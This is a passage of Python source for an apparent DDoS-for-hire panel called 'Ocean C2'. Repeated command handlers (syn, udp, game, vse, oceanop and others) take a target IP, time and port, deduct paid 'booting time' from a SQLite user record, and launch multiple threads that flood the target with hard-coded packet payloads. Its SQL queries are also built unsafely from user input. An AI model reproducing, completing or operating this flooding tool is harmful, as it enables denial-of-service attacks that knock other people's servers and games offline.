                            payload = b"\x58\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: syn <ip> <time> <port>')
                print('/> Example: syn 1.1.1.1 120 80')
                print("\n")

        elif sinput == "udp":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                    print('/> Usage: udp <ip> <time> <port>')
                    print('/> Example: udp 1.1.1.1 120 80')
                    print("\n")

        elif sinput == "game":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: game <ip> <time> <port>')
                print('/> Example: game 1.1.1.1 120 80')
                print("\n")

        elif sinput == "oceanop":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            payload1 = b"\x55\x55\x55\x55\x00\x00\x00\x01"
                            payload2 = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
                            payload3 = b"\x58\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                            payload4 = b"\x73\x74\x64\x00\x00\x00\x00\x00"
                            payload5 = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            payload6 = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload1)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload2)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload3)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload4)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload5)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload6)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload1)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload2)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload3)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload4)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload5)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload6)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttacked
               \x1b[38;2;240;240;240m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;240;240;240m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: oceanop <ip> <time> <port>')
                print('/> Example: oceanop 1.1.1.1 120 80')
                print("\n")

        elif sinput == "kitchengun":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x00\x10\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: kitchengun <ip> <time> <port>')
                print('/> Example: kitchengun 1.1.1.1 120 80')
                print("\n")

        elif sinput == "nfo":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x58\x99\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: nfo <ip> <time> <port>')
                print('/> Example: nfo 1.1.1.1 120 80')
                print("\n")

        elif sinput == "tcp":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: tcp <ip> <time> <port>')
                print('/> Example: tcp 1.1.1.1 120 80')
                print("\n")

        elif sinput == "vse":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: vse <ip> <time> <port>')
                print('/> Example: vse 1.1.1.1 120 80')
                print("\n")

        elif sinput == "telnet":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: telnet <ip> <time> <port>')
                print('/> Example: telnet 1.1.1.1 120 80')
                print("\n")
        elif sinput == "hexrape":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttacked
               \x1b[38;2;240;240;240m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
